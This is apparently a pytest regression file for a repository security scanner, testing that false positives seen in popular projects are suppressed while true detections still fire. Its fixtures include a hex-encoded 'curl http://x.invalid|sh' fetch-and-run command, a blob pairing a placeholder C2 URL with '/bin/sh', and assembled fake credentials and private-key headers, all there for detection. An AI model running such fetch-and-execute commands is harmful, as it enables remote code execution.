"""Noise found by scanning twenty-one widely used repositories.

Twenty-four thousand files of Django, React, Vue, ESLint, Guava, OkHttp,
Prometheus, ripgrep, tokio, serde, Celery, SQLAlchemy, boto3, Scrapy, httpx,
axios, lodash, express, click, black and cobra produced 2,394 findings. Nine
distinct causes accounted for 91% of them, and every one is reproduced here.

Two are worth calling out because they were not tuning, they were wrong:

The bidi rule flagged U+200B-U+200D. Zero-width non-joiner is mandatory in
Persian and Hindi orthography and zero-width joiner is in every modern emoji;
neither reorders anything. Ninety-five findings in Django's translation
catalogues were for text that is simply written correctly.

`-----BEGIN` matched a CERTIFICATE, which is public by design and committed on
purpose in every TLS test suite.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category, Severity
from cordon_scanner.detect.binary import _COMMAND
from cordon_scanner.detect.obfuscation import BIDI_AND_INVISIBLE
from cordon_scanner.detect.secrets import NOT_A_SECRET, PLACEHOLDER
from support import assemble


def flagged(root) -> set[str]:
    return {
        f.rule_id
        for f in Scanner().scan(root).findings
        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
    }


class TestCharactersThatDoNotReorderText:
    @pytest.mark.parametrize(
        ("codepoint", "why"),
        [
            (0x200B, "zero-width space: an ordinary line-break hint"),
            (0x200C, "zero-width non-joiner: mandatory in Persian and Hindi"),
            (0x200D, "zero-width joiner: in every modern emoji sequence"),
            (0x200E, "left-to-right mark: ordinary in bidirectional text"),
            (0x200F, "right-to-left mark: the same"),
        ],
    )
    def test_a_non_directional_character_is_not_trojan_source(
        self, codepoint: int, why: str
    ) -> None:
        assert BIDI_AND_INVISIBLE.search(f"x {chr(codepoint)} y".encode()) is None, why

    @pytest.mark.parametrize("codepoint", [0x202A, 0x202B, 0x202C, 0x202D, 0x202E, 0x2066, 0x2069])
    def test_an_override_or_isolate_still_is(self, codepoint: int) -> None:
        assert BIDI_AND_INVISIBLE.search(f"x {chr(codepoint)} y".encode()) is not None

    def test_a_translation_catalogue_is_data_not_source(self, tmp_path) -> None:
        """A `.po` for a right-to-left language embeds directional characters in
        the text it will display. That is data shown to a user, not logic read
        by a reviewer."""
        catalogue = tmp_path / "django.po"
        catalogue.write_text(f'msgid "x"\nmsgstr "{chr(0x202B)}text"\n', encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.BIDI.001" not in flagged(tmp_path)


class TestPublicMaterialIsNotSecret:
    def test_a_certificate_is_not_a_credential(self, tmp_path) -> None:
        """Committed on purpose in every TLS test suite; thirty-nine findings in
        OkHttp alone."""
        header = assemble("-----BEGIN ", "CERTIFICATE", "-----")
        (tmp_path / "Certs.java").write_text(
            f'String cert = "{header}\\n" + "MIIBkTCB+wIJAKt...";\n', encoding="utf-8"
        )
        assert flagged(tmp_path) == set()

    def test_a_private_key_still_is(self, tmp_path) -> None:
        header = assemble("-----BEGIN ", "PRIVATE KEY", "-----")
        (tmp_path / "Keys.java").write_text(
            f'String key = "{header}\\n" + "MIIBkTCB+wIJAKt...";\n', encoding="utf-8"
        )
        # Reported by the provider rule, which names it, rather than the
        # generic one.
        assert "SECRET.PRIVATE_KEY.001" in flagged(tmp_path)


class TestIdentifiersAndPaths:
    @pytest.mark.parametrize(
        "value",
        [
            b"calleeParenCount",
            b"firstTokenOfCallee",
            b"TOKEN_BLOCK_BEGIN",
            b"entity.other.attribute-name",
            b"/random/file/which/does/not/exist.yml",
        ],
    )
    def test_a_name_or_path_is_not_a_credential(self, value: bytes) -> None:
        assert NOT_A_SECRET.match(value)

    # Assembled, not written whole. This file is scanned by the tool it tests,
    # and a complete key literal here is a true positive the tool should not
    # need an exception for.
    @pytest.mark.parametrize(
        "value",
        [
            assemble("kR9mT2nQ8vL4", "xW7yZ3bC6dF1").encode(),
            assemble("AKIA", "Q7XKLMNPQRSTUVWX").encode(),
            assemble("S3cr3tP4ss", "w0rdXyz9Qq").encode(),
        ],
    )
    def test_key_material_survives_every_exclusion(self, value: bytes) -> None:
        """The camelCase exclusion allows no digits for exactly this reason:
        base62 key material alternates case and includes them, so a permissive
        rule excludes the values this detector exists to find."""
        assert not NOT_A_SECRET.match(value)

    @pytest.mark.parametrize(
        "value", [b"password", b"mypassword", b"mysecret", b"username", b"yourtoken"]
    )
    def test_a_documentation_placeholder_is_recognised(self, value: bytes) -> None:
        assert PLACEHOLDER.search(value)

    @pytest.mark.parametrize(
        "value",
        [b"hunter2", b"s00pers3cret", assemble("kR9mT2n", "Q8vL4").encode()],
    )
    def test_a_real_looking_value_is_not_a_placeholder(self, value: bytes) -> None:
        assert not PLACEHOLDER.search(value)


class TestGeneratedAssets:
    @pytest.mark.parametrize(
        "path", ["icon.svg", "app.mo", "messages.po", "dist/bundle.js", "assets/vendor.js"]
    )
    def test_a_generated_asset_is_not_reported_for_line_length(self, tmp_path, path) -> None:
        target = tmp_path / path
        target.parent.mkdir(parents=True, exist_ok=True)
        blob = assemble("kR9mT2nQ8vL4xW7yZ3bC", "6dF1gH5jK0pS9rT2") * 200
        target.write_text(blob + "\n", encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)

    def test_a_data_file_with_no_language_is_not_source(self, tmp_path) -> None:
        """The rule's own docstring said "source-shaped files only" and never
        checked it. A MaxMind database and an XML fixture are data, and a long
        line in data is what data looks like."""
        blob = assemble("kR9mT2nQ8vL4xW7yZ3bC", "6dF1gH5jK0pS9rT2") * 200
        (tmp_path / "GeoLite2.mmdb").write_text(blob + "\n", encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)


class TestUnicodeTablesAreData:
    def test_a_codepoint_table_is_not_a_concealed_string(self, tmp_path) -> None:
        """XRegExp ships four hundred escapes of Gurmukhi script ranges. A
        concealed string decodes to text somebody typed; a table decodes to
        codepoints nobody types. The discriminator existed and was applied only
        to the split-across-the-file branch."""
        table = "".join(f"\\\\u0A{i:02X}" for i in range(0x10, 0x60))
        (tmp_path / "ranges.js").write_text(f'const gurmukhi = "{table}";\n', encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.ENCODED.001" not in flagged(tmp_path)

    def test_a_concealed_ascii_payload_still_fires(self, tmp_path) -> None:
        hidden = "".join(f"\\\\x{ord(c):02x}" for c in "curl http://x.invalid|sh")
        (tmp_path / "loader.js").write_text(f'const c = "{hidden}";\n', encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.ENCODED.001" in flagged(tmp_path)


class TestBinaryStrings:
    def test_one_kind_of_string_is_not_evidence(self, tmp_path) -> None:
        """Almost every data blob carries a URL: a compiled translation
        catalogue records the project's homepage. That was 1,218 findings,
        more than half of all the noise these repositories produced."""
        (tmp_path / "django.mo").write_bytes(
            b"\xde\x12\x04\x95" + b"\x00" * 40 + b"https://www.djangoproject.com\x00" + b"\x00" * 40
        )
        assert "SUSPECT.BINARY.STRINGS.001" not in flagged(tmp_path)

    def test_a_url_and_a_shell_command_together_are(self, tmp_path) -> None:
        (tmp_path / "blob").write_bytes(
            b"\x00\x01\x02\x03" * 8 + b"https://c2.invalid/x\x00/bin/sh\x00" + b"\x00" * 32
        )
        assert "SUSPECT.BINARY.STRINGS.001" in flagged(tmp_path)

    def test_the_command_pattern_matches_between_nul_bytes(self) -> None:
        """A leading `\\b` needs a word character beside it, and in a binary
        these strings sit between NUL bytes -- so the assertion failed exactly
        where the pattern was meant to run."""
        assert _COMMAND.search(b"x\x00/bin/sh\x00")


class TestNoPackageIsASquatOfItself:
    """Found by scanning Cargo's own repository.

    `'serde_json' is one plausible typing slip away from 'serde_json'` is what
    the tool said, at high severity. The popular sets are written as each
    project spells itself -- `serde_json` with an underscore -- while a
    dependency arrives normalised, and Cargo folds underscore to hyphen. So
    `serde-json` was compared against `serde_json`, and since this detector
    treats `-` and `_` as adjacent keys, the difference read as a typing slip.

    Both sides of a name comparison have to be normalised the same way. That is
    the kind of invariant worth asserting over the whole data set rather than
    over an example.
    """

    def test_no_popular_package_reports_itself(self) -> None:
        from cordon_scanner.detect.dependency import DependencyDetector
        from cordon_scanner.ecosystems.registry import EcosystemRegistry
        from cordon_scanner.intel.popular import PackageIntel

        detector = DependencyDetector()
        offenders = []
        for ecosystem, names in PackageIntel.POPULAR_PACKAGES.items():
            implementation = EcosystemRegistry.get(ecosystem)
            if implementation is None:
                continue
            for name in names:
                normalised = implementation.normalize_name(name)
                target = detector._typosquat_target(ecosystem, normalised)
                if target is not None:
                    offenders.append(f"{ecosystem}:{name} -> {target}")
        assert not offenders, offenders

    def test_every_popular_package_is_known(self) -> None:
        """The check that runs before typosquat comparison, under the same
        normalisation."""
        from cordon_scanner.ecosystems.registry import EcosystemRegistry
        from cordon_scanner.intel.popular import PackageIntel

        unknown = []
        for ecosystem, names in PackageIntel.POPULAR_PACKAGES.items():
            implementation = EcosystemRegistry.get(ecosystem)
            if implementation is None:
                continue
            for name in names:
                if not PackageIntel.is_known_package(
                    ecosystem, implementation.normalize_name(name)
                ):
                    unknown.append(f"{ecosystem}:{name}")
        assert not unknown, unknown

    def test_the_check_is_not_vacuous(self) -> None:
        from cordon_scanner.intel.popular import PackageIntel

        assert sum(len(v) for v in PackageIntel.POPULAR_PACKAGES.values()) > 150

    def test_a_real_squat_still_fires(self) -> None:
        from cordon_scanner.detect.dependency import DependencyDetector

        detector = DependencyDetector()
        assert detector._typosquat_target("cargo", "serde-jsonn") == "serde-json"
        assert detector._typosquat_target("npm", "lodahs") == "lodash"


class TestAScanMustNotCrash:
    """Found by scanning Next.js, which aborted with `IndexError`.

    `language_from_interpreter` reads the token after the last slash and takes
    its first word. The same routine reads tokens out of lifecycle commands,
    and `"eslint src/"` leaves nothing after the last slash -- an empty list,
    indexed.

    This is the most expensive failure mode this project has. Every other error
    path produces a finding saying what was not examined; a crash produces no
    result to attach one to, so the scan of a 21,000-file repository returned
    nothing at all.
    """

    @pytest.mark.parametrize(
        "token", ["src/", "/", "", "   ", "packages/next/", "//", "a/b/", "\t"]
    )
    def test_a_token_with_nothing_after_the_slash_is_not_an_interpreter(self, token: str) -> None:
        from cordon_scanner.langs.registry import LanguageRegistry

        assert LanguageRegistry.language_from_interpreter(token) is None

    @pytest.mark.parametrize(
        ("shebang", "language"),
        [
            ("#!/usr/bin/env python3", "python"),
            ("/bin/sh", "shell"),
            ("#!/usr/bin/env node", "javascript"),
        ],
    )
    def test_a_real_shebang_still_resolves(self, shebang: str, language: str) -> None:
        from cordon_scanner.langs.registry import LanguageRegistry

        assert LanguageRegistry.language_from_interpreter(shebang) == language

    def test_a_lifecycle_script_with_a_trailing_slash_scans(self, tmp_path) -> None:
        """The shape that crashed it, end to end."""
        (tmp_path / "package.json").write_text(
            '{"name": "p", "version": "1.0.0", '
            '"scripts": {"lint": "eslint src/", "test": "jest test/unit/ packages/next/"}}',
            encoding="utf-8",
        )
        result = Scanner().scan(tmp_path)
        assert result.complete is True


class TestScopeResolutionIsNotAssignment:
    """`::` in C++ is not an assignment, and reading it as one produced a
    hundred and forty findings in Node's vendored V8 and ICU alone.

    The name that made them fire is the joke: `RegExpAssertion` contains
    "pass", `CBORTokenTag` contains "token", and a `case X::Y::LONG_MEMBER:`
    label has a colon on both sides of something long enough to look like a
    value."""

    @pytest.mark.parametrize(
        "line",
        [
            "case RegExpAssertion::Type::START_OF_INPUT:",
            "case CBORTokenTag::ENVELOPE_CONTENTS:",
            "case Token::Value::ASSIGN_SHL_LOGICAL:",
            "return token_type::value_separator_string;",
        ],
    )
    def test_a_scoped_enum_member_is_not_a_credential(self, tmp_path, line: str) -> None:
        (tmp_path / "a.cc").write_text(f"switch (t) {{\n  {line}\n}}\n", encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" not in flagged(tmp_path)

    def test_a_single_colon_still_assigns(self, tmp_path) -> None:
        value = assemble("hunter2", "Sup3r", "SecretV")
        (tmp_path / "a.yml").write_text(f'password: "{value}"\n', encoding="utf-8")
        assert "SECRET.GENERIC.ASSIGNMENT.001" in flagged(tmp_path)


class TestValuesThatNameSomethingElse:
    """OpenSSL's EVP test vectors assign key *names* to `PrivateKey` and hex
    digests to `SharedSecret`. Seven hundred and forty-five findings in every
    project that vendors OpenSSL, which is most of them."""

    @pytest.mark.parametrize(
        "value",
        [
            "ALICE_cf_brainpoolP160r1",
            "BOB_cf_brainpoolP256r1",
            "2E75CB6A8F13951B437E04A0ED1D714A610036CC",
            "2e75cb6a8f13951b437e04a0ed1d714a610036cc",
        ],
    )
    def test_an_identifier_or_digest_is_not_key_material(self, value: str) -> None:
        assert NOT_A_SECRET.match(value.encode()) is not None

    @pytest.mark.parametrize(
        "parts",
        [
            ("glpat-", "AAAAAAAAAAAAAAAA"),
            ("hunter2", "Sup3r", "SecretValue"),
            ("aB3-kQ9mZ2xT7", "vL4nR8wY6pC1dF5"),
        ],
    )
    def test_a_separator_does_not_launder_key_material(self, parts: tuple[str, ...]) -> None:
        """A hyphen between a prefix and twenty random characters is what a
        provider token looks like, not what an identifier looks like. The
        exclusion is refused as soon as one class runs long."""
        assert NOT_A_SECRET.match(assemble(*parts).encode()) is None

    def test_an_endpoint_named_after_what_it_issues_is_not_a_secret(self) -> None:
        assert NOT_A_SECRET.match(b"https://oauth2.googleapis.com/token") is not None

    def test_a_url_carrying_a_password_still_is(self) -> None:
        url = assemble("https://admin:", "s3cr3t", "Passw0rd", "@internal/api")
        assert NOT_A_SECRET.match(url.encode()) is None


class TestTheReportedLineIsTheCredentialsLine:
    def test_an_assignment_points_at_its_own_line(self, tmp_path) -> None:
        """The pattern opens by consuming the character before the name, which
        on every line but the first is the previous line's newline. Every
        finding this rule produced pointed one line too high."""
        value = assemble("hunter2", "Sup3r", "SecretV")
        (tmp_path / "a.py").write_text(
            f"import os\nimport sys\npassword = {value!r}\n", encoding="utf-8"
        )
        lines = {
            f.location.line
            for f in Scanner().scan(tmp_path).findings
            if f.rule_id == "SECRET.GENERIC.ASSIGNMENT.001"
        }
        assert lines == {3}


class TestCredentialsWhereTestsKeepThem:
    """Four hundred and eighty-eight of the five hundred and seventy-six
    private keys found across thirty-eight production repositories were under a
    test path, and every one was generated so a TLS test would have something
    to serve."""

    @property
    def PEM(self) -> str:
        # Joined at call time. Cordon folds constant `+` chains and matches the
        # joined value, so a split literal here is still a private key header
        # in this repository's own tree.
        return assemble("-----BEGIN RSA ", "PRIVATE KEY-----\n", "MIIBOgIBAAJBAKj34GkxFhD9\n")

    @pytest.mark.parametrize(
        "path",
        [
            "tests/fixtures/key.pem",
            "test/units/urls/fixtures/client.key",
            "src/__tests__/server.key",
            "internal/testdata/ca.pem",
            "examples/security/ssl/worker.key",
            "pkg/util/uri_sanitize_test.go",
        ],
    )
    def test_a_key_there_is_still_reported_but_not_at_critical(self, tmp_path, path: str) -> None:
        target = tmp_path / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(self.PEM, encoding="utf-8")

        found = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert len(found) == 1, "the finding must survive: the key is still a key"
        assert found[0].severity <= Severity.MEDIUM
        assert "test material" in found[0].message

    def test_a_key_anywhere_else_is_critical(self, tmp_path) -> None:
        (tmp_path / "deploy").mkdir()
        (tmp_path / "deploy" / "server.key").write_text(self.PEM, encoding="utf-8")
        found = [
            f for f in Scanner().scan(tmp_path).findings if f.rule_id == "SECRET.PRIVATE_KEY.001"
        ]
        assert [f.severity for f in found] == [Severity.CRITICAL]

    @pytest.mark.parametrize(
        ("path", "is_fixture"),
        [
            ("tests/conftest.py", True),
            ("src/testing/harness.go", True),
            ("app/spec/models_spec.rb", True),
            ("src/latest/config.py", False),
            ("contested/settings.py", False),
            ("src/protest.js", False),
        ],
    )
    def test_the_path_test_is_about_directories_not_substrings(self, path, is_fixture) -> None:
        """`contested/` and `latest/` contain the word and are not test
        directories. A substring check would have quietly halved the severity
        of every finding in them."""
        from cordon_scanner.detect.secrets import is_test_material

        assert is_test_material(path) is is_fixture


class TestLinesThatAreLongBecauseSomethingGeneratedThem:
    # Deterministic, and high-entropy enough to clear the rule's own floor --
    # a repeated four-character run is 2 bits per character and would pass
    # these tests for the wrong reason.
    LONG = "".join(
        "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"[(i * 37 + i * i) % 64]
        for i in range(2600)
    )

    def test_a_file_that_says_it_is_generated_is_not_read_as_source(self, tmp_path) -> None:
        (tmp_path / "a.js").write_text(
            f"// Code generated by protoc-gen-go. DO NOT EDIT.\nconst t = '{self.LONG}';\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)

    def test_an_inline_source_map_is_a_comment(self, tmp_path) -> None:
        (tmp_path / "a.js").write_text(
            f"const a = 1;\n//# sourceMappingURL=data:application/json;base64,{self.LONG}\n",
            encoding="utf-8",
        )
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)

    @pytest.mark.parametrize(
        "path",
        [
            "bundle.json",
            "deps/undici/undici.js",
            "packages/next/src/compiled/react/index.js",
            "test/fixtures/source-map/inline.js",
            "internal/testdata/dump.js",
            ".github/workflows/ci.lock.yml",
        ],
    )
    def test_data_and_vendored_paths_waive_line_length_only(self, tmp_path, path: str) -> None:
        target = tmp_path / path
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(f"const t = '{self.LONG}';\n", encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" not in flagged(tmp_path)

    def test_a_long_line_in_ordinary_source_still_is(self, tmp_path) -> None:
        (tmp_path / "a.js").write_text(f"const t = '{self.LONG}';\n", encoding="utf-8")
        assert "SUSPECT.OBFUSCATION.LONGLINE.001" in flagged(tmp_path)
